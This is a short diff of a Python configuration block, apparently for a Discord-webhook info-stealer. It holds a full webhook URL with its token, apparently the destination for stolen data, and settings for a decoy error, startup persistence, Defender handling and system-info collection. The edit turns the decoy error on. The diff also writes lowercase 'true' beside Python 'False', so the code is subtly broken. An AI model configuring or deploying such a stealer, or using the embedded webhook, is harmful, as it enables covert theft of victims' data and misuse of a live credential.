@@ -25,7 +25,7 @@ __CONFIG__ = {
     "webhook": "https://discord.com/api/webhooks/1149943258961694811/y2Zny9aY3TAXaTdEWr9sfvAlUha_FAi02TZ8BRZISR31ZjJ8_Gc7Fkbbvi5X2d_u2-nL",
     "ping": False,
     "pingtype": "None",
-    "fakeerror": False,
+    "fakeerror": true,
     "startup": False,
     "defender": False,
     "systeminfo": true,
